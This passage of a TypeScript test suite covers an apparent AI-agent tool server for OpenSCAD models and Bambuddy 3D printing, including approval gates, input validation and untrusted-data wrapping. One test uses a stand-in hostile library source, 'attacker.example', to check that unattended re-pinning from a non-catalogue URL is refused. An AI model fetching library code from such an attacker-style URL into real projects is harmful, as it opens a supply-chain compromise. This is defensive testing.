          start(controller) {
            for (let i = 0; i < 8; i++) controller.enqueue(new Uint8Array(8))
            controller.close()
          },
        })
        return new HttpResponse(body, { headers: { 'content-type': 'model/gltf-binary' } })
      }),
    )
    const result = await runTool(tool('get_render_preview'), { job_id: 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' }, ctx({ maxInlineBytes: 16 }))
    expect(result.isError).toBeFalsy()
    expect(result.content[0]).toMatchObject({ type: 'resource_link', uri: '/api/v1/jobs/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee/preview.glb' })
    expect((result.content[1] as { text: string }).text).toContain('SCADBUDDY_PUBLIC_URL')
  })

  it('get_asset with content: small image inline, large one linked', async () => {
    const asset = 'b'.repeat(64)
    let size = 4
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/assets/${asset}`, () => HttpResponse.json({ id: asset })),
      http.get(`${BACKEND}/api/v1/models/box/assets/${asset}/content`, () =>
        new HttpResponse(new Uint8Array(size), { headers: { 'content-type': 'image/png' } }),
      ),
    )
    const args = { slug: 'box', asset_id: asset, include_content: true }
    const small = await runTool(tool('get_asset'), args, ctx({ maxInlineBytes: 16 }))
    expect(small.content.map((c) => c.type)).toEqual(['text', 'text', 'image'])
    size = 64
    const large = await runTool(tool('get_asset'), args, ctx({ maxInlineBytes: 16 }))
    expect(large.isError).toBeFalsy()
    expect(large.content.map((c) => c.type)).toEqual(['text', 'resource_link', 'text'])
  })
})

describe("tools for #324's routes", () => {
  const CATALOGUE = [{ name: 'BOSL2', url: 'https://github.com/BelfrySCAD/BOSL2', ref: 'v2.0.0', homepage: '', licence: '' }]
  const model = (url: string) => ({ slug: 'box', name: 'Box', libraries: [{ name: 'BOSL2', url, ref: 'main', commit: 'a'.repeat(40) }] })

  it('reads diagnostics, installed libraries and asset usage', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/diagnostics`, () => HttpResponse.json({ warnings: [{ line: 3 }] })),
      http.get(`${BACKEND}/api/v1/libraries/installed`, () => HttpResponse.json([{ name: 'BOSL2', commit: 'c', used_by: ['box'] }])),
      http.get(`${BACKEND}/api/v1/assets/usage`, () => HttpResponse.json({ count: 1, bytes: 2, max_count: 0, max_total_bytes: 0 })),
    )
    expect(firstText(await runTool(tool('get_render_diagnostics'), { slug: 'box' }, ctx()))).toEqual({ warnings: [{ line: 3 }] })
    expect(firstText(await runTool(tool('list_installed_libraries'), {}, ctx()))).toEqual({ items: [{ name: 'BOSL2', commit: 'c', used_by: ['box'] }], next_cursor: null, total: 1 })
    expect(firstText(await runTool(tool('get_asset_usage'), {}, ctx()))).toMatchObject({ count: 1 })
  })

  it('draws a view inline, and links it when it is over the cap', async () => {
    const job = 'd'.repeat(32)
    let requested = ''
    server.use(
      http.get(`${BACKEND}/api/v1/jobs/${job}/views/top.png`, ({ request }) => {
        requested = new URL(request.url).search
        return new HttpResponse(new Uint8Array(32), { headers: { 'content-type': 'image/png' } })
      }),
    )
    const inline = await runTool(tool('get_render_view'), { job_id: job, view: 'top', size: 256 }, ctx())
    expect(JSON.parse((inline.content[0] as { text: string }).text)).toEqual({
      untrusted_data: {
        tool: 'get_render_view',
        source: expect.any(String),
        content_follows: { type: 'image', mime_type: 'image/png' },
      },
    })
    expect(inline.content[1]).toMatchObject({ type: 'image', mimeType: 'image/png' })
    expect(requested).toBe('?size=256')
    const linked = await runTool(tool('get_render_view'), { job_id: job, view: 'top' }, ctx({ maxInlineBytes: 8 }))
    expect(linked.content[0]).toMatchObject({ type: 'resource_link', uri: `/api/v1/jobs/${job}/views/top.png` })
  })

  it('removing a library checkout is outward (irreversible) and only prepares', async () => {
    expect(tool('remove_library_checkout').risk).toBe('outward')
    const result = await runTool(tool('remove_library_checkout'), { name: 'BOSL2' }, ctx())
    expect(firstText(result)).toMatchObject({ status: 'pending_approval', summary: 'Delete every checkout of library BOSL2' })
  })

  it('re-pins a catalogue library unattended, and refuses one pinned from another URL', async () => {
    let pinnedFrom = CATALOGUE[0]!.url
    let patched: unknown
    server.use(
      http.get(`${BACKEND}/api/v1/models/box`, () => HttpResponse.json(model(pinnedFrom))),
      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
      http.patch(`${BACKEND}/api/v1/models/box/libraries/BOSL2`, async ({ request }) => {
        patched = await request.json()
        return HttpResponse.json({ slug: 'box' })
      }),
    )
    expect((await runTool(tool('repin_library'), { slug: 'box', name: 'BOSL2', ref: 'v2.1.0' }, ctx())).isError).toBeFalsy()
    expect(patched).toEqual({ ref: 'v2.1.0' })

    patched = undefined
    pinnedFrom = 'https://attacker.example/BOSL2'
    const refused = await runTool(tool('repin_library'), { slug: 'box', name: 'BOSL2' }, ctx())
    expect(refused.isError).toBe(true)
    expect(firstText(refused)).toContain('repin_library_from_pinned_url')
    expect(patched).toBeUndefined()

    expect(firstText(await runTool(tool('repin_library_from_pinned_url'), { slug: 'box', name: 'BOSL2' }, ctx()))).toMatchObject({
      status: 'pending_approval',
    })
  })
})

describe('base64 inputs', () => {
  it('refuses malformed base64 instead of uploading truncated bytes', async () => {
    const result = await runTool(tool('upload_asset'), { slug: 'box', filename: 'a.png', content_base64: 'iVBOR!!w0K' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('not valid base64')
  })
})

describe('set_print_options: a settings write (spec §8.1), unlike the remember_* choices', () => {
  it('is outward and only prepares, while remember_* are write', async () => {
    expect(tool('set_print_options').risk).toBe('outward')
    expect(tool('remember_model_print_choices').risk).toBe('write')
    expect(tool('remember_printer_bed_type').risk).toBe('write')
    // No backend handler: reaching PUT /settings/print-options would fail the test.
    const result = await runTool(tool('set_print_options'), { scope: 'global', options: { timelapse: true } }, ctx())
    expect(firstText(result)).toMatchObject({
      status: 'pending_approval',
      summary: 'Remember print options for global: {"timelapse":true}',
    })
  })
})

describe('id arguments match the backend path patterns', () => {
  it('refuses a malformed output id with a clear message, before any backend call', async () => {
    const result = await runTool(tool('get_output'), { output_id: 'out-1' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('must be an output id: 32 lowercase hex digits, as list_outputs returns it')
  })
  it('refuses a malformed job id the same way', async () => {
    const result = await runTool(tool('get_render_job'), { job_id: 'J1' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('must be a render job id: 32 lowercase hex digits')
  })
})

describe('invalid arguments', () => {
  it('come back as a tool error, not an exception', async () => {
    const result = await runTool(tool('get_model'), { slug: 'Not A Slug' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('invalid arguments')
  })

  it('refuse a send that still asks to queue, instead of quietly uploading (#312)', async () => {
    const result = await runTool(
      { ...tool('send_to_bambuddy'), gated: false },
      { output_id: '0123456789abcdef0123456789abcdef', mode: 'queue', copies: 2 },
      ctx(),
    )
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('invalid arguments')
  })
})

describe('print media (#307)', () => {
  it('fetches a print photo by its Bambuddy file name, as an image', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/prints/35/photos/finish_1790488620_ab12.jpg`, () =>
        new HttpResponse(new Uint8Array(8), { headers: { 'content-type': 'image/jpeg' } }),
      ),
    )
    const result = await runTool(tool('get_print_image'), { archive_id: 35, photo: 'finish_1790488620_ab12.jpg' }, ctx())
    expect(result.content[1]).toMatchObject({ type: 'image', mimeType: 'image/jpeg' })
  })

  it('fetches a plate image, or the thumbnail with neither photo nor plate', async () => {
    const hit: string[] = []
    server.use(
      http.get(`${BACKEND}/api/v1/prints/35/plates/2/thumbnail`, ({ request }) => {
        hit.push(new URL(request.url).pathname)
        return new HttpResponse(new Uint8Array(8), { headers: { 'content-type': 'image/png' } })
      }),
      http.get(`${BACKEND}/api/v1/prints/35/thumbnail`, ({ request }) => {
        hit.push(new URL(request.url).pathname)
        return new HttpResponse(new Uint8Array(8), { headers: { 'content-type': 'image/png' } })
      }),
    )
    await runTool(tool('get_print_image'), { archive_id: 35, plate: 2 }, ctx())
    await runTool(tool('get_print_image'), { archive_id: 35 }, ctx())
    expect(hit).toEqual(['/api/v1/prints/35/plates/2/thumbnail', '/api/v1/prints/35/thumbnail'])
  })

  it('refuses both a photo and a plate at once', async () => {
    const result = await runTool(tool('get_print_image'), { archive_id: 35, photo: 'a.jpg', plate: 1 }, ctx())
    expect(result.isError).toBe(true)
  })

  it('links the timelapse rather than inlining a video over the cap', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/prints/35/timelapse`, () =>
        new HttpResponse(new Uint8Array(64), { headers: { 'content-type': 'video/mp4', 'content-length': '64' } }),
      ),
    )
    const result = await runTool(
      tool('get_print_timelapse'),
      { archive_id: 35 },
      ctx({ maxInlineBytes: 16, publicBaseUrl: 'https://scadbuddy.example/' }),
    )
    expect(result.content[0]).toMatchObject({
      type: 'resource_link',
      uri: 'https://scadbuddy.example/api/v1/prints/35/timelapse',
      mimeType: 'video/mp4',
    })
  })

  it('downloads the sliced or the source 3MF', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/prints/35/files/source`, () =>
        new HttpResponse(new Uint8Array([1, 2, 3, 4]), { headers: { 'content-type': 'model/3mf' } }),
      ),
    )
    const result = await runTool(tool('download_print_file'), { archive_id: 35, file: 'source' }, ctx({ maxInlineBytes: 16 }))
    expect(result.content).toEqual([
      { type: 'text', text: expect.stringContaining('"content_follows"') },
      { type: 'resource', resource: { uri: 'scadbuddy://prints/35/files/source', mimeType: 'model/3mf', blob: 'AQIDBA==' } },
    ])
    expect(tool('download_print_file').risk).toBe('read')
  })
})

describe('prints (#308)', () => {
  it('lists prints with the filters as query parameters', async () => {
    let query: URLSearchParams | undefined
    server.use(
      http.get(`${BACKEND}/api/v1/prints`, ({ request }) => {
        query = new URL(request.url).searchParams
        return HttpResponse.json({ items: [], next_cursor: null })
      }),
    )
    const result = await runTool(
      tool('list_prints'),
      { slug: 'keychain', status: 'failed', printer_id: 2, from: '2026-09-01', to: '2026-09-28', q: 'Elan', limit: 10, cursor: '35' },
      ctx(),
    )
    expect(result.isError).toBeFalsy()
    expect(Object.fromEntries(query!)).toEqual({
      slug: 'keychain',
      status: 'failed',
      printer_id: '2',
      from: '2026-09-01',
      to: '2026-09-28',
      q: 'Elan',
      limit: '10',
      cursor: '35',
    })
  })

  it('gets one print, asking the printer only when told to', async () => {
    const asked: string[] = []
    server.use(
      http.get(`${BACKEND}/api/v1/prints/35`, ({ request }) => {
        asked.push(new URL(request.url).search)
        return HttpResponse.json({ archive_id: 35 })
      }),
    )
    await runTool(tool('get_print'), { archive_id: 35 }, ctx())
    await runTool(tool('get_print'), { archive_id: 35, printer_media: true }, ctx())
    expect(asked).toEqual(['', '?printer_media=true'])
  })

  it('reads only', () => {
    expect(tool('list_prints').risk).toBe('read')
    expect(tool('get_print').risk).toBe('read')
  })
})

describe('print_again and pull_print_timelapse (#311)', () => {
  it('queues the archive again', async () => {
    let posted = false
    server.use(
      http.post(`${BACKEND}/api/v1/prints/35/reprint`, () => {
        posted = true
        return HttpResponse.json({ queue_item_id: 51, printer_id: 1, bambuddy_url: 'https://b/queue' }, { status: 201 })
      }),
    )
    const pending = await runTool(tool('print_again'), { archive_id: 35 }, { ...ctx(), pending: new PendingActionStore() })
    expect(firstText(pending)).toMatchObject({ status: 'pending_approval' })
    expect(posted).toBe(false)
    const result = await runTool({ ...tool('print_again'), gated: false }, { archive_id: 35 }, ctx())
    expect(result.isError).toBeFalsy()
    expect(posted).toBe(true)
    expect(JSON.stringify(result.content)).toContain('51')
  })

  it('pulls a named timelapse off the printer', async () => {
    let body: unknown
    server.use(
      http.post(`${BACKEND}/api/v1/prints/35/timelapse/pull`, async ({ request }) => {
        body = await request.json()
        return new HttpResponse(null, { status: 204 })
      }),
    )
    const result = await runTool({ ...tool('pull_print_timelapse'), gated: false }, { archive_id: 35, filename: 'video_1.mp4' }, ctx())
    expect(result.isError).toBeFalsy()
    expect(body).toEqual({ filename: 'video_1.mp4' })
  })

  it('are outward, behind the approval gate', () => {
    expect(tool('print_again').risk).toBe('outward')
    expect(tool('pull_print_timelapse').risk).toBe('outward')
  })

  it('declare every Bambuddy scope their route needs: the archive read, then the write', () => {
    expect(tool('print_again').bambuddyScope).toEqual(['Read Status', 'Manage Queue'])
    expect(tool('pull_print_timelapse').bambuddyScope).toEqual(['Read Status', 'Manage Archives'])
  })
})

describe('get_output_preview (#308)', () => {
  it("embeds the output's preview mesh", async () => {
    const id = 'a'.repeat(32)
    server.use(
      http.get(`${BACKEND}/api/v1/outputs/${id}/preview.glb`, () =>
        new HttpResponse(new Uint8Array([1, 2, 3, 4]), { headers: { 'content-type': 'model/gltf-binary' } }),
      ),
    )
    const result = await runTool(tool('get_output_preview'), { output_id: id }, ctx({ maxInlineBytes: 16 }))
    expect(result.content).toEqual([
      { type: 'text', text: expect.stringContaining('"content_follows"') },
      {
        type: 'resource',
        resource: { uri: `scadbuddy://outputs/${id}/preview.glb`, mimeType: 'model/gltf-binary', blob: 'AQIDBA==' },
      },
    ])
  })
})

describe('project tools (#317)', () => {
  const OUT = 'c'.repeat(32)

  it('remember_last_project sends the chosen project, and null for "No project"', async () => {
    const bodies: unknown[] = []
    server.use(
      http.put(`${BACKEND}/api/v1/print/projects/last`, async ({ request }) => {
        const body = (await request.json()) as { project_id: number | null }
        bodies.push(body)
        return HttpResponse.json(body)
      }),
    )
    const chosen = await tool('remember_last_project').execute({ project_id: 7 }, ctx())
    const cleared = await tool('remember_last_project').execute({ project_id: null }, ctx())
    expect(chosen.isError).toBeFalsy()
    expect(cleared.isError).toBeFalsy()
    expect(bodies).toEqual([{ project_id: 7 }, { project_id: null }])
    expect(firstText(chosen)).toEqual({ project_id: 7 })
  })

  it('file_output_in_project_folder posts the project to the output and answers with the file', async () => {
    const filed = {
      project_id: 7,
      folder_id: 9,
      library_file_id: 41,
      filename: 'Demo.3mf',
      created: true,
      bambuddy_url: 'http://b/projects/7',
    }
    const bodies: unknown[] = []
    server.use(
      http.post(`${BACKEND}/api/v1/outputs/${OUT}/project-file`, async ({ request }) => {
        bodies.push(await request.json())
        return HttpResponse.json(filed)
      }),
    )
    const fileTool = tool('file_output_in_project_folder')
    const result = await fileTool.execute({ output_id: OUT, project_id: 7 }, ctx())
    expect(result.isError).toBeFalsy()
    expect(bodies).toEqual([{ project_id: 7 }])
    expect(firstText(result)).toEqual(filed)
    expect(fileTool.risk).toBe('outward')
    expect(fileTool.summarize?.({ output_id: OUT, project_id: 7 })).toBe(
      `Upload output ${OUT}'s 3MF into Bambuddy project 7's folder`,
    )
  })

  it('file_output_in_project_folder reports a refusal as an error', async () => {
    server.use(
      http.post(`${BACKEND}/api/v1/outputs/${OUT}/project-file`, () =>
        HttpResponse.json({ detail: 'no such project' }, { status: 404 }),
      ),
    )
    await expect(
      tool('file_output_in_project_folder').execute({ output_id: OUT, project_id: 7 }, ctx()),
    ).rejects.toThrow(/HTTP 404/)
  })
})

describe('dependencies: include resolution and fonts (#253)', () => {
  const REPORT = {
    includes: [
      {
        file: 'model.scad',
        line: 1,
        kind: 'use',
        target: 'BOSL2/std.scad',
        status: 'unresolved',
        reason: 'no BOSL2/std.scad beside the file that names it, and the model pins no libraries',
        suggestion: { name: 'BOSL2', source: 'catalogue', url: 'https://github.com/BelfrySCAD/BOSL2.git', ref: 'v2.0.761' },
      },
    ],
    unresolved: 1,
    fonts: [],
    fonts_checked: true,
    missing_checkouts: [],
    truncated: false,
  }

  it('check_dependencies is a read tool that sends the unsaved source, or none', async () => {
    const bodies: unknown[] = []
    server.use(
      http.post(`${BACKEND}/api/v1/models/box/dependencies`, async ({ request }) => {
        bodies.push(await request.json())
        return HttpResponse.json(REPORT)
      }),
    )
    const check = tool('check_dependencies')
    expect(check.risk).toBe('read')
    expect(firstText(await runTool(check, { slug: 'box', source: 'use <BOSL2/std.scad>\n' }, ctx()))).toEqual(REPORT)
    await runTool(check, { slug: 'box' }, ctx())
    expect(bodies).toEqual([{ source: 'use <BOSL2/std.scad>\n' }, { source: null }])
  })

  it("passes the backend's refusal of a missing font family through as an error", async () => {
    const detail =
      "parameter 'font' names font family 'Pacifico', which is not installed. OpenSCAD would silently draw it " +
      'in the default font instead; install the family (POST /fonts/install) or name one GET /fonts lists'
    server.use(
      http.post(`${BACKEND}/api/v1/fonts/install`, () =>
        HttpResponse.json(
          { detail: "'Pacifico' was downloaded, but fontconfig does not resolve that family afterwards" },
          { status: 500 },
        ),
      ),
      http.get(`${BACKEND}/api/v1/models/box/schema`, () =>
        HttpResponse.json({ groups: [], parameters: [{ name: 'font', type: 'font', initial: 'DejaVu Sans' }] }),
      ),
      http.post(`${BACKEND}/api/v1/models/box/render`, () =>
        HttpResponse.json({ detail, parameters: ['font'], families: ['Pacifico'] }, { status: 422 }),
      ),
    )
    const install = await runTool(tool('install_font'), { family: 'Pacifico' }, ctx())
    expect(install.isError).toBe(true)
    expect(JSON.stringify(install.content)).toContain('does not resolve')

    const render = await runTool(tool('render_model'), { slug: 'box', params: { font: 'Pacifico' } }, ctx())
    expect(render.isError).toBe(true)
    expect(JSON.stringify(render.content)).toContain('default font instead')
  })
})

describe('list_versions paging (#837)', () => {
  const history = Array.from({ length: 120 }, (_, i) => ({
    commit: `c${String(i).padStart(3, '0')}`,
    short: `c${i}`,
    message: `revision ${i}`,
    author: 'a',
    date: '2026-09-30T00:00:00Z',
    current: i === 0,
    files: [],
    agent: null,
  }))

  it('asks the backend for no more history than the page needs, and knows when it has it all', async () => {
    const limits: number[] = []
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/versions`, ({ request }) => {
        const limit = Number(new URL(request.url).searchParams.get('limit'))
        limits.push(limit)
        return HttpResponse.json(history.slice(0, limit))
      }),
    )
    const first = firstText(await runTool(tool('list_versions'), { slug: 'box', limit: 10 }, ctx())) as {
      items: { commit: string }[]
      next_cursor: string
      total: number | null
    }
    expect(first.items.map((v) => v.commit)).toEqual(history.slice(0, 10).map((v) => v.commit))
    expect(first.total).toBeNull()
    const second = firstText(
      await runTool(tool('list_versions'), { slug: 'box', limit: 10, cursor: first.next_cursor }, ctx()),
    ) as { items: { commit: string }[] }
    expect(second.items.map((v) => v.commit)).toEqual(history.slice(10, 20).map((v) => v.commit))
    // A page and a page of slack, plus one: never the whole 500-revision window.
    expect(limits).toEqual([21, 31])

    // A history shorter than the read is known complete: its total is exact.
    const whole = firstText(await runTool(tool('list_versions'), { slug: 'box', limit: 100 }, ctx())) as {
      total: number | null
      next_cursor: string | null
    }
    expect(limits.at(-1)).toBe(201)
    expect(whole.total).toBe(120)
    expect(whole.next_cursor).toEqual(expect.any(String))
  })

  it('reads the whole window, rather than calling the cursor stale, when new revisions push its item past the read', async () => {
    let served = history
    const limits: number[] = []
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/versions`, ({ request }) => {
        const limit = Number(new URL(request.url).searchParams.get('limit'))
        limits.push(limit)
        return HttpResponse.json(served.slice(0, limit))
      }),
    )
    const first = firstText(await runTool(tool('list_versions'), { slug: 'box', limit: 10 }, ctx())) as {
      next_cursor: string
    }
    // 40 revisions land ahead of the cursor's item: more than the read's slack.
    const fresh = Array.from({ length: 40 }, (_, i) => ({ ...history[0]!, commit: `n${String(i).padStart(3, '0')}` }))
    served = [...fresh, ...history]
    const second = firstText(
      await runTool(tool('list_versions'), { slug: 'box', limit: 10, cursor: first.next_cursor }, ctx()),
    ) as { items: { commit: string }[] }
    expect(second.items.map((v) => v.commit)).toEqual(history.slice(10, 20).map((v) => v.commit))
    expect(limits).toEqual([21, 31, 500])
  })

  it("refuses a cursor issued for another model's history", async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/models/:slug/versions`, ({ request }) => {
        const limit = Number(new URL(request.url).searchParams.get('limit'))
        return HttpResponse.json(history.slice(0, limit))
      }),
    )
    const first = firstText(await runTool(tool('list_versions'), { slug: 'box', limit: 10 }, ctx())) as {
      next_cursor: string
    }
    const other = await runTool(tool('list_versions'), { slug: 'lid', limit: 10, cursor: first.next_cursor }, ctx())
    expect(other.isError).toBe(true)
    expect(JSON.stringify(other.content)).toMatch(/another listing/)
  })
})
